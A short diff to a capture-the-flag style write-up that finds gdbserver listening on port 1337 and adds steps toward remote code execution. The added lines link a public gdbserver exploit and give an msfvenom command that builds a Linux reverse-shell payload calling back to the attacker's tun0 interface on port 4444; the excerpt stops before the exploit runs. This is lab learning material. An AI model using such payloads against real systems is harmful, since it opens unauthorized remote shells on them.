@@ -221,4 +221,17 @@ Looking at it you will see
 /bin/sh -c while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done
 ```
 
-Now with this we know that its gdbserver thats running on port 1337
+With this we know that its gdbserver thats running on port 1337
+
+I searched for exploit and got this [Exploit](https://www.exploit-db.com/exploits/50539)
+
+Following what the exploit requires i'll generate a shellcode using msfvenom
+![image](https://user-images.githubusercontent.com/113513376/221270425-ea5b86f6-b993-48d2-865f-9fc190f3b47b.png)
+
+
+```
+Command:  msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 PrependFork=true -o rev.bin
+```
+
+Now i'll run the exploit
+
